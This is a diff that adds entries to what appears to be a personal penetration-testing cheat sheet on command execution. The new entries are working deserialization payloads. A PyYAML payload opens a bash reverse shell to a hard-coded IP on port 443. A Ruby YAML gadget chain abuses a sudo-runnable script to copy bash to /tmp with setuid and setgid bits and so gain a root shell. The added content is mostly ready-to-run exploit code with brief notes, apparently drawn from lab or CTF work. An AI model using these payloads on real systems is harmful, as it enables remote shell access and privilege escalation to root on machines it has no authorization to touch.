@@ -60,6 +60,23 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 			- Removed in Python 3.
 			- If you need to evaluate user input as code (which is generally discouraged), you must explicitly use `eval()`
 
+PyYAML deserialization attacks
+```
+import yaml
+
+data = """
+!!python/object/new:os.system
+- echo EXPLOIT!
+"""
+yaml_data = yaml.load(data)
+```
+- unsafe example: yaml.load is unsafe
+```
+!!python/object/new:type
+  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
+  listitems: "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.13.0.22/443 0>&1\"')"
+```
+- rev shell payload (replace IP and port for `nc` listener)
 #### PHP
 ```
 <?php
@@ -105,6 +122,63 @@ puts `whoami`
 system('whoami')
 ```
 
+Ruby YAML Deserialization privesc:
+```
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+```
+- unsafe YAML code, which was part of a script that user can run with sudo perms
+```
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+- POC to save dependencies.yml file in example above 
+	- saving in any writable directory should work; does not have to be in the same directory as the ruby script
+- if upon running script with unsafe yaml again, should see `id` output (in addition to potential error messages), means POC worked. Replace with malicious payload:
+```
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf
+         method_id: :resolve
+```
+- copies bash to `/tmp/0xdf` then modifies setid and setgid so anyone can run it and it runs as root
+```
+/tmp/0xdf -p
+```
+- root shell
 #### Perl
 ```
 system('whoami');
